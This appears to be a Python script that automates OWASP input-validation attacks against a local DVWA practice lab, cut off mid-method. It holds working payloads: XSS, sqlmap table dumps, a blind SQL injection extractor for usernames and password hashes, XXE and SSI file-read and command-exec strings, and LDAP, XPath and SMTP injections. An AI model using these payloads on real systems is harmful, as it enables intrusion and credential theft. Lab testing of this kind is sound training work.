import requests
from bs4 import BeautifulSoup
from datetime import datetime
import socket
import urllib.parse
from urllib.parse import urlparse
import argparse
import subprocess
import os

class DVWATester:
    def __init__(self, base_url="http://localhost:8080", username="admin", password="password"):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.log_file = "dvwa_test_master_log.txt"
        self.security_level = "low"


    def write_log(self, entry: str):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} | {entry}\n")


    def login(self):
        """Login to DVWA and set security level to low"""
        login_url = f"{self.base_url}/login.php"
        security_url = f"{self.base_url}/security.php"
        
        # Get login page and extract token
        resp = self.session.get(login_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        token = token_input['value'] if token_input else ''
        
        # Perform login
        data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
            "user_token": token
        }
        login_resp = self.session.post(login_url, data=data)
        
        if "logout.php" in login_resp.text:
            self.write_log(f"[+] Login successful (Status: {login_resp.status_code})")
            
            # Set security level to low
            sec_resp = self.session.get(security_url)
            sec_soup = BeautifulSoup(sec_resp.text, 'html.parser')
            sec_token = sec_soup.find("input", {"name": "user_token"})['value']
            
            sec_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": sec_token
            }
            self.session.post(security_url, data=sec_data)
            self.write_log("[+] Security level set to low")
            return True
        else:
            self.write_log(f"[-] Login failed (Status: {login_resp.status_code})")
            return False


    def OTG_INPVAL_001(self):
        """Test for Reflected XSS"""
        self.write_log("----- Starting OTG-INPVAL-001 (Reflected XSS) -----")
        xss_url = f"{self.base_url}/vulnerabilities/xss_r/"
        payload = '<script>alert("XSS")</script>'
        
        # URL encode the payload
        params = {"name": payload}
        full_url = f"{xss_url}?{urllib.parse.urlencode(params)}"
        
        # Send the request
        resp = self.session.get(full_url)
        
        # Check if payload is reflected
        if payload in resp.text:
            self.write_log(f"[✓] Reflected XSS payload found in response! URL: {full_url}")
            print("[+] Reflected XSS successful.")
        else:
            self.write_log(f"[✗] Reflected XSS payload not found. Possibly filtered or encoded. URL: {full_url}")
            print("[-] Reflected XSS failed or filtered.")
        
        self.write_log("----- OTG-INPVAL-001 Test Completed -----\n")


    def OTG_INPVAL_002(self):
        """Test for Stored XSS"""
        self.write_log("----- Starting OTG-INPVAL-002 (Stored XSS) -----")
        xss_url = f"{self.base_url}/vulnerabilities/xss_s/"
        payload = '<script>alert("XSS")</script>'
        
        # Get the form and CSRF token
        resp = self.session.get(xss_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        
        # Prepare the payload
        data = {
            "txtName": "attacker",
            "mtxMessage": payload,
            "btnSign": "Sign Guestbook",
        }
        
        if token_input:
            token = token_input['value']
            data["user_token"] = token
            self.write_log(f"[i] CSRF token found and used: {token}")
        
        # Submit the payload
        post_resp = self.session.post(xss_url, data=data)
        self.write_log(f"[+] Payload submitted (Status: {post_resp.status_code}) | Payload: {payload}")
        
        # Check if the payload was stored
        check_resp = self.session.get(xss_url)
        if payload in check_resp.text:
            self.write_log("[✓] XSS payload found in response — likely vulnerable to Stored XSS")
            print("[+] Stored XSS succeeded.")
        else:
            self.write_log("[✗] XSS payload NOT found — might be filtered or encoded")
            print("[-] Stored XSS failed or sanitized.")
        
        self.write_log("----- OTG-INPVAL-002 Test Completed -----\n")
    

    def OTG_INPVAL_003(self):
        """Test for HTTP Verb Tampering"""
        self.write_log("----- Starting OTG-INPVAL-003 (HTTP Verb Tampering) -----")
        target_url = f"{self.base_url}/vulnerabilities/brute/"
        http_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH", "TRACE"]
        get_response_length = None
        
        for method in http_methods:
            try:
                response = self.session.request(method, target_url)
                content_length = len(response.text)

                if method == "GET":
                    get_response_length = content_length

                # Analyze unexpected behavior
                note = ""
                if method not in ["GET", "POST", "HEAD", "OPTIONS"] and response.status_code == 200:
                    if content_length == get_response_length:
                        note = "⚠️ Same length as GET — potential handler fallback or misconfig"
                    else:
                        note = "⚠️ 200 OK on non-standard verb — unexpected"
                elif response.status_code not in [200, 403, 405]:
                    note = f"⚠️ Unusual status code {response.status_code}"

                self.write_log(f"[{method}] Status: {response.status_code} | Length: {content_length} {note}")

            except Exception as e:
                self.write_log(f"[{method}] Error: {str(e)}")
        
        self.write_log("----- OTG-INPVAL-003 Test Completed -----\n")


    def OTG_INPVAL_004(self):
        """Test for HTTP Parameter Pollution"""
        self.write_log("----- Starting OTG-INPVAL-004 (HTTP Parameter Pollution) -----")
        
        # Test URLs for HPP
        test_urls = [
            f"{self.base_url}/vulnerabilities/xss_r/",  # Reflected XSS
            f"{self.base_url}/vulnerabilities/xss_s/",  # Stored XSS
            f"{self.base_url}/vulnerabilities/sqli/",   # SQL Injection
            f"{self.base_url}/vulnerabilities/fi/",     # File Inclusion
        ]
        
        test_params = {
            'name': ['hpp_test1', 'hpp_test2'],
            'test': ['hpp_test1', 'hpp_test2'],
            'page': ['hpp_test1', 'hpp_test2'],
            'id': ['hpp_test1', 'hpp_test2'],
        }
        
        for url in test_urls:
            self.write_log(f"\n[+] Testing URL: {url}")
            
            # Find parameter names for the current page
            r = self.session.get(url)
            soup = BeautifulSoup(r.text, 'html.parser')
            form = soup.find('form')
            if not form:
                self.write_log("  - No form found, skipping...")
                continue
                
            param_names = []
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    param_names.append(input_tag.get('name'))
            
            if not param_names:
                self.write_log("  - No parameters found, skipping...")
                continue
            
            # Test each parameter
            for param in param_names:
                test_values = test_params.get(param, ['hpp_test1', 'hpp_test2'])
                
                # Create payload with duplicate parameters
                payload = [(param, test_values[0]), (param, test_values[1])]
                
                # Send request
                if form.get('method', '').upper() == 'POST':
                    r = self.session.post(url, data=payload)
                else:
                    r = self.session.get(url, params=payload)
                
                # Check results
                if test_values[0] in r.text and test_values[1] in r.text:
                    self.write_log(f"  ! Vulnerable parameter found: {param} (both values processed)")
                elif test_values[1] in r.text:
                    self.write_log(f"  ! Vulnerable parameter found: {param} (last value processed)")
                elif test_values[0] in r.text:
                    self.write_log(f"  - Parameter processed: {param} (first value processed)")
                else:
                    self.write_log(f"  - No reflection found for: {param}")
        
        self.write_log("----- OTG-INPVAL-004 Test Completed -----\n")


    def OTG_INPVAL_005(self):
        """Test for SQL Injection (using sqlmap)"""
        self.write_log("----- Starting OTG-INPVAL-005 (SQL Injection) -----")
        target_url = f"{self.base_url}/vulnerabilities/sqli/"
        post_data = 'id=1&Submit=Submit'
        
        # Get cookies for sqlmap
        cookie = self.session.cookies.get_dict()
        cookie_str = '; '.join([f'{k}={v}' for k, v in cookie.items()]) + '; security=low'
        
        # Prepare sqlmap command
        sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap-dev', 'sqlmap.py')
        output_file = f"sqlmap_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        cmd = [
            'python', sqlmap_path,
            '-u', target_url,
            '--batch',
            '--level=2',
            '--risk=1',
            '--random-agent',
            '--smart',
            '--banner',
            '--cookie', cookie_str,
            '--data', post_data,
            '-D', 'dvwa', '-T', 'users', '--dump'
        ]
        
        self.write_log(f"[i] Running sqlmap command: {' '.join(cmd)}")
        print("[i] Running sqlmap (this may take a while)...")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(result.stdout)
                if result.stderr:
                    f.write('\n[stderr]\n' + result.stderr)
            
            self.write_log(f"[+] sqlmap output saved to {output_file}")
            print(f"[+] SQL injection test completed. Results saved to {output_file}")
        except Exception as e:
            self.write_log(f"[-] Error running sqlmap: {str(e)}")
            print("[-] Error running sqlmap")
        
        self.write_log("----- OTG-INPVAL-005 Test Completed -----\n")


    def OTG_INPVAL_005_Blind(self):
        """Test for Blind SQL Injection"""
        self.write_log("----- Starting OTG-INPVAL-005-Blind (Blind SQL Injection) -----")
        target_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
        
        def test_condition(payload):
            r = self.session.get(target_url, params={"id": payload, "Submit": "Submit"})
            return "User ID exists" in r.text
        
        def extract_field(field, index, label, max_len=64):
            extracted = ""
            self.write_log(f"[i] Extracting {label} #{index + 1} via blind SQLi")
            for pos in range(1, max_len + 1):
                for c in "abcdefghijklmnopqrstuvwxyz0123456789":
                    payload = f"1' AND SUBSTRING((SELECT {field} FROM users LIMIT {index},1),{pos},1)='{c}'-- -"
                    if test_condition(payload):
                        extracted += c
                        self.write_log(f"[+] Char {pos}: {c}")
                        break
                else:
                    break
            self.write_log(f"[✓] Extracted {label} #{index + 1}: {extracted}")
            return extracted
        
        index = 0
        while True:
            username = extract_field("user", index, "username", max_len=20)
            if not username:
                self.write_log(f"[i] No username found at index {index}, stopping.")
                break
            
            password = extract_field("password", index, "password hash", max_len=64)
            self.write_log(f"[✓] User #{index + 1}: {username} | Hash: {password}\n")
            index += 1
        
        self.write_log("----- OTG-INPVAL-005-Blind Test Completed -----\n")


    def OTG_INPVAL_006(self):
        """Test for LDAP Injection"""
        self.write_log("----- Starting OTG-INPVAL-006 (LDAP Injection) -----")
        
        # Test LDAP injection vectors
        ldap_test_url = f"{self.base_url}/vulnerabilities/brute/"  # Using brute page as example
        login_url = f"{self.base_url}/login.php"
        
        # Common LDAP injection payloads
        ldap_payloads = [
            "*",                            # Wildcard
            "*)(uid=*))(|(uid=*",           # Always true condition
            "admin)(|(password=*",          # Boolean condition
            "admin*",                       # Wildcard after
            "*admin",                       # Wildcard before
            ")(cn=*))%00",                  # Null byte termination
            "(|(cn=*",                      # OR condition start
            "(&(cn=*",                      # AND condition start
            "!(cn=test)",                   # NOT condition
            "admin)(|(objectclass=*",       # Object class injection
            "\\2a",                         # Encoded *
            "\\28\\29",                     # Encoded parentheses
            "\\00"                          # Null byte
        ]
        
        # Test 1: LDAP injection in search functionality (simulated)
        self.write_log("[i] Testing LDAP injection in search functionality")
        for payload in ldap_payloads:
            try:
                # Simulating search with LDAP payload
                params = {"username": payload, "password": "test", "Login": "Login"}
                resp = self.session.get(ldap_test_url, params=params)
                
                # Check for unusual responses
                if "error" in resp.text.lower():
                    self.write_log(f"[!] Possible LDAP injection with payload '{payload}' - Error returned")
                elif len(resp.text) > 5000:  # Large response might indicate successful injection
                    self.write_log(f"[!] Possible LDAP injection with payload '{payload}' - Large response")
                elif "Welcome" in resp.text:
                    self.write_log(f"[✓] Successful LDAP injection with payload '{payload}' - Auth bypass")
                else:
                    self.write_log(f"[-] Payload '{payload}' - No obvious injection")
            
            except Exception as e:
                self.write_log(f"[x] Error testing payload '{payload}': {str(e)}")
        
        # Test 2: LDAP authentication bypass
        self.write_log("\n[i] Testing LDAP authentication bypass")
        bypass_payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(|(password=*",
            "*)(objectclass=*))(|(uid=*"
        ]
        
        for payload in bypass_payloads:
            try:
                # Get login token first
                resp = self.session.get(login_url)
                soup = BeautifulSoup(resp.text, 'html.parser')
                token_input = soup.find("input", {"name": "user_token"})
                token = token_input['value'] if token_input else ''
                
                # Try authentication bypass
                data = {
                    "username": payload,
                    "password": "anypassword",
                    "Login": "Login",
                    "user_token": token
                }
                login_resp = self.session.post(login_url, data=data)
                
                if "logout.php" in login_resp.text:
                    self.write_log(f"[✓] Successful LDAP auth bypass with payload '{payload}'")
                    print(f"[+] LDAP authentication bypass successful with payload: {payload}")
                else:
                    self.write_log(f"[-] LDAP auth bypass failed with payload '{payload}'")
            
            except Exception as e:
                self.write_log(f"[x] Error testing auth bypass payload '{payload}': {str(e)}")
        
        self.write_log("----- OTG-INPVAL-006 Test Completed -----\n")


    def OTG_INPVAL_007(self):
        """Test for ORM Injection"""
        self.write_log("----- Starting OTG-INPVAL-007 (ORM Injection) -----")
        
        # Test URLs - focusing on pages that might use ORM for database operations
        test_urls = [
            f"{self.base_url}/vulnerabilities/sqli/",       # SQLi page might use ORM
            f"{self.base_url}/vulnerabilities/brute/",     # Login might use ORM
            f"{self.base_url}/vulnerabilities/xss_s/",     # Guestbook might use ORM
        ]
        
        # ORM injection payloads - similar to SQLi but targeting ORM abstractions
        orm_payloads = [
            "' OR 1=1--",
            "' OR ''='",
            "') OR ('1'='1",
            "1 ORDER BY 1--",
            "1 UNION SELECT 1,2,3--",
            "*",
            "null"
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # First get the page to find forms and parameters
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # FIX: Properly handle form action (use current URL if action is empty or '#')
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    # Handle relative paths
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with ORM payloads
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for payload in orm_payloads:
                        try:
                            # Prepare the payload data (include all form inputs)
                            data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                if name == param:
                                    data[name] = payload
                                elif name:  # Include other fields with their original values
                                    data[name] = value
                            
                            # Debug: Log the request being made
                            self.write_log(f"    [i] Testing payload: {payload}")
                            self.write_log(f"    [i] Request to: {form_action} ({form_method})")
                            
                            # Send the request
                            if form_method == 'POST':
                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            # Analyze response
                            if resp.status_code != 200:
                                self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'")
                                continue
                                
                            # Check for signs of injection
                            if "error" in resp.text.lower():
                                self.write_log(f"    [!] Possible ORM injection - Error with payload '{payload}'")
                            elif "exception" in resp.text.lower():
                                self.write_log(f"    [!] Possible ORM injection - Exception with payload '{payload}'")
                            elif "syntax" in resp.text.lower():
                                self.write_log(f"    [!] Possible ORM injection - Syntax error with payload '{payload}'")
                            elif "Welcome" in resp.text or "success" in resp.text.lower():
                                self.write_log(f"    [✓] Successful ORM injection with payload '{payload}'")
                            else:
                                self.write_log(f"    [-] No obvious injection with payload '{payload}'")
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-INPVAL-007 Test Completed -----\n")


    def OTG_INPVAL_008(self):
        """Test for XML Injection"""
        self.write_log("----- Starting OTG-INPVAL-008 (XML Injection) -----")
        
        # Target URLs that might process XML data
        test_urls = [
            f"{self.base_url}/vulnerabilities/xss_s/",  # Guestbook might use XML
            f"{self.base_url}/vulnerabilities/sqli/",   # SQLi page might use XML
            f"{self.base_url}/vulnerabilities/brute/"   # Login might use XML
        ]
        
        # XML injection payloads
        xml_payloads = [
            # XML metacharacters
            "'", "\"", ">", "<", "&", 
            "<!--", "-->", "<![CDATA[", "]]>",
            
            # Basic XML injection
            "<injected>test</injected>",
            "<![CDATA[<script>alert(1)</script>]]>",
            
            # XXE payloads
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://internal.server/secret.txt'>]><foo>&xxe;</foo>",
            
            # Tag injection
            "</username><userid>0</userid><username>",
            "<mail>attacker@evil.com</mail><!--",
            "--><userid>0</userid><mail>"
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action (use current URL if action is empty or '#')
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    # Handle relative paths
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with XML payloads
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for payload in xml_payloads:
                        try:
                            # Prepare the payload data (include all form inputs)
                            data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                if name == param:
                                    data[name] = payload
                                elif name:  # Include other fields with their original values
                                    data[name] = value
                            
                            # Send the request
                            if form_method == 'POST':
                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            # Analyze response for signs of XML injection
                            if resp.status_code != 200:
                                self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'")
                                continue
                                
                            # Check for XML-specific responses
                            if "XML" in resp.headers.get('Content-Type', '') or \
                               "xml" in resp.text.lower() or \
                               "<parsererror>" in resp.text.lower():
                                self.write_log(f"    [!] Possible XML processing with payload '{payload}'")
                            
                            # Check for error messages
                            if "error" in resp.text.lower():
                                self.write_log(f"    [!] Possible XML injection - Error with payload '{payload}'")
                            elif "exception" in resp.text.lower():
                                self.write_log(f"    [!] Possible XML injection - Exception with payload '{payload}'")
                            elif "unexpected" in resp.text.lower():
                                self.write_log(f"    [!] Possible XML injection - Unexpected response with payload '{payload}'")
                            elif "xml" in resp.text.lower():
                                self.write_log(f"    [!] Possible XML injection - XML response with payload '{payload}'")
                            elif payload.strip("<>") in resp.text:
                                self.write_log(f"    [✓] Possible XML injection - Payload reflected with '{payload}'")
                            else:
                                self.write_log(f"    [-] No obvious XML injection with payload '{payload}'")
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-INPVAL-008 Test Completed -----\n")


    def OTG_INPVAL_009(self):
        """Test for SSI (Server-Side Includes) Injection"""
        self.write_log("----- Starting OTG-INPVAL-009 (SSI Injection) -----")
        
        # Target URLs that might reflect user input
        test_urls = [
            f"{self.base_url}/vulnerabilities/xss_r/",  # Reflected input
            f"{self.base_url}/vulnerabilities/xss_s/",  # Stored input
            f"{self.base_url}/vulnerabilities/exec/",  # Command execution page
            f"{self.base_url}/vulnerabilities/sqli/"   # SQLi page might reflect input
        ]
        
        # SSI injection payloads
        ssi_payloads = [
            # Basic SSI directives
            "<!--#echo var='DOCUMENT_NAME'-->",
            "<!--#echo var='DOCUMENT_URI'-->",
            
            # File inclusion
            "<!--#include virtual='/etc/passwd'-->",
            "<!--#include file='/etc/passwd'-->",
            
            # Command execution
            "<!--#exec cmd='ls'-->",
            "<!--#exec cmd='id'-->",
            
            # Shortened versions
            "<!--#echo var='DATE_LOCAL' --",
            "<!--#include virtual='/etc/passwd' --",
            
            # Without comments (some servers accept this)
            "#exec cmd='whoami'",
            
            # Environment variables
            "<!--#printenv -->",
            "<!--#echo var='REMOTE_ADDR'-->",
            
            # File system access
            "<!--#fsize file='/etc/passwd'-->",
            "<!--#flastmod file='/etc/passwd'-->",
            
            # If-else statements
            "<!--#if expr='test' -->Injected<!--#endif -->",
            
            # Cookie manipulation
            "<!--#cookie name='USER_COOKIE'-->"
        ]
        
        # Additional test for HTTP headers
        header_payloads = [
            ("Referer", "<!--#exec cmd='id'-->"),
            ("User-Agent", "<!--#include virtual='/etc/passwd'-->"),
            ("X-Forwarded-For", "<!--#echo var='DOCUMENT_NAME'-->")
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Test 1: Form-based SSI injection
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if forms:
                for form in forms:
                    # Handle form action
                    form_action = form.get('action')
                    if not form_action or form_action == '#':
                        form_action = url
                    else:
                        if not form_action.startswith(('http://', 'https://')):
                            form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                    
                    form_method = form.get('method', 'GET').upper()
                    inputs = form.find_all('input')
                    
                    # Find all input parameters
                    param_names = []
                    for input_tag in inputs:
                        if input_tag.get('name') and input_tag.get('type') != 'hidden':
                            param_names.append(input_tag.get('name'))
                    
                    if not param_names:
                        self.write_log("  - No parameters found in form")
                        continue
                    
                    # Test each parameter with SSI payloads
                    for param in param_names:
                        self.write_log(f"  - Testing parameter: {param}")
                        
                        for payload in ssi_payloads:
                            try:
                                # Prepare the payload data
                                data = {}
                                for inp in inputs:
                                    name = inp.get('name')
                                    value = inp.get('value', '')
                                    if name == param:
                                        data[name] = payload
                                    elif name:
                                        data[name] = value
                                
                                # Send the request
                                if form_method == 'POST':
                                    resp = self.session.post(form_action, data=data)
                                else:
                                    resp = self.session.get(form_action, params=data)
                                
                                # Analyze response for SSI injection
                                self._check_ssi_response(resp, payload)
                            
                            except Exception as e:
                                self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                                continue
            
            # Test 2: URL parameter-based SSI injection
            if '?' in url:  # If URL already has parameters
                test_url = f"{url}&test=1"
            else:
                test_url = f"{url}?test=1"
            
            for payload in ssi_payloads:
                try:
                    # Test GET parameter injection
                    resp = self.session.get(test_url, params={"test": payload})
                    self._check_ssi_response(resp, payload)
                except Exception as e:
                    self.write_log(f"    [x] Error testing URL param with payload '{payload}': {str(e)}")
        
        # Test 3: HTTP header injection
        self.write_log("\n[i] Testing HTTP headers for SSI injection")
        for header, payload in header_payloads:
            try:
                headers = {header: payload}
                resp = self.session.get(self.base_url, headers=headers)
                self._check_ssi_response(resp, payload, f"header {header}")
            except Exception as e:
                self.write_log(f"    [x] Error testing header {header} with payload '{payload}': {str(e)}")
        
        self.write_log("----- OTG-INPVAL-009 Test Completed -----\n")
    
    def _check_ssi_response(self, resp, payload, context=""):
        """Helper method to check responses for signs of SSI injection"""
        context = f" ({context})" if context else ""
        
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'{context}")
            return
            
        # Check for signs of successful SSI injection
        success_patterns = [
            ("root:", "Possible file inclusion"),
            ("uid=", "Possible command execution"),
            ("DOCUMENT_", "Possible environment variable leak"),
            ("/bin/", "Possible command reference"),
            ("<!--#", "SSI tag reflected"),
            ("/etc/passwd", "Possible file access")
        ]
        
        for pattern, message in success_patterns:
            if pattern in resp.text:
                self.write_log(f"    [✓] {message} with payload '{payload}'{context}")
                return
        
        # Check for error messages
        error_patterns = [
            "SSI", "Server Side Include", "premature end of script", 
            "execution failed", "malformed header", "parse error"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible SSI injection - {error} error with payload '{payload}'{context}")
                return
        
        # Check if payload is reflected
        if payload.strip("<!-->#") in resp.text:
            self.write_log(f"    [!] SSI payload partially reflected with '{payload}'{context}")
        else:
            self.write_log(f"    [-] No obvious SSI injection with payload '{payload}'{context}")


    def OTG_INPVAL_010(self):
        """Test for XPath Injection"""
        self.write_log("----- Starting OTG-INPVAL-010 (XPath Injection) -----")
        
        # Target URLs that might use XPath queries
        test_urls = [
            f"{self.base_url}/vulnerabilities/sqli/",   # Might use XPath
            f"{self.base_url}/vulnerabilities/brute/",  # Login might use XPath
            f"{self.base_url}/vulnerabilities/xss_s/"   # Might process XML
        ]
        
        # XPath injection payloads
        xpath_payloads = [
            # Basic authentication bypass
            "' or '1'='1",
            "' or ''='",
            "') or ('1'='1",
            
            # XPath specific injections
            "' or 1=1 or ''='",
            "' or position()=1 or ''='",
            "' or count(/*)=1 or ''='",
            "' or string-length(name(/*[1]))=4 or ''='",
            
            # Blind XPath techniques
            "' and count(/*)=1 and '1'='1",
            "' and string-length(name(/*[1]))=4 and '1'='1",
            
            # Error-based detection
            "' or count(/*)='",  # Should cause error
            "' or contains(name(/*[1]),'x') or ''='",
            
            # Node extraction
            "' or //user[position()=1]/username | //user[position()=1]/password or ''='"
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with XPath payloads
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for payload in xpath_payloads:
                        try:
                            # Prepare the payload data
                            data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                if name == param:
                                    data[name] = payload
                                elif name:
                                    data[name] = value
                            
                            # Send the request
                            if form_method == 'POST':
                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            # Analyze response for XPath injection
                            self._check_xpath_response(resp, payload)
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-INPVAL-010 Test Completed -----\n")
    
    def _check_xpath_response(self, resp, payload):
        """Helper method to check responses for signs of XPath injection"""
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'")
            return
            
        # Check for signs of successful XPath injection
        success_patterns = [
            ("root:x:", "Possible authentication bypass"),
            ("XML", "Possible XML/XPath processing"),
            ("XPath", "XPath reference found"),
            ("user", "Possible user data exposure"),
            ("password", "Possible password data exposure"),
            ("position()", "XPath function reflected"),
            ("count(", "XPath function reflected")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with payload '{payload}'")
                return
        
        # Check for error messages
        error_patterns = [
            "XPath", "XPATH", "xpath", 
            "XML", "xml", "parser error",
            "syntax error", "query", "expression"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible XPath injection - {error} error with payload '{payload}'")
                return
        
        # Check for authentication bypass
        if "Welcome" in resp.text or "Login successful" in resp.text:
            self.write_log(f"    [✓] Possible authentication bypass with payload '{payload}'")
            return
            
        # Check if payload is reflected
        if payload.strip("'") in resp.text:
            self.write_log(f"    [!] XPath payload partially reflected with '{payload}'")
        else:
            self.write_log(f"    [-] No obvious XPath injection with payload '{payload}'")


    def OTG_INPVAL_011(self):
        """Test for IMAP/SMTP Injection"""
        self.write_log("----- Starting OTG-INPVAL-011 (IMAP/SMTP Injection) -----")
        
        # Target URLs that might interact with email functionality
        test_urls = [
            f"{self.base_url}/vulnerabilities/exec/",  # Command execution might include email
            f"{self.base_url}/vulnerabilities/sqli/",  # Might process email data
            f"{self.base_url}/contact.php"             # Contact forms often use SMTP
        ]
        
        # IMAP/SMTP injection payloads
        imap_smtp_payloads = [
            # Basic injection attempts
            "\"", "'", "\\", "#", "!", "|",
            
            # IMAP command injections
            "INBOX\" CREATE EvilFolder",
            "INBOX\" DELETE ImportantFolder",
            "INBOX\" RENAME FolderA FolderB",
            
            # SMTP command injections
            "test@example.com\" RCPT TO:attacker@evil.com",
            "test@example.com\" VRFY root",
            "test@example.com\" EXPN admin-group",
            
            # CRLF injections
            "%0d%0aCAPABILITY",
            "%0d%0aNOOP",
            "%0d%0aAUTHENTICATE PLAIN",
            
            # Full command injections
            "INBOX\"%0d%0aCREATE EvilFolder%0d%0aINBOX\"",
            "test@example.com\"%0d%0aMAIL FROM:attacker@evil.com%0d%0aRCPT TO:attacker@evil.com",
            
            # Blind command injections
            "INBOX\" AND 1=1",
            "test@example.com' OR '1'='1"
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with IMAP/SMTP payloads
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for payload in imap_smtp_payloads:
                        try:
                            # Prepare the payload data
                            data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                if name == param:
                                    data[name] = payload
                                elif name:
                                    data[name] = value
                            
                            # Send the request
                            if form_method == 'POST':
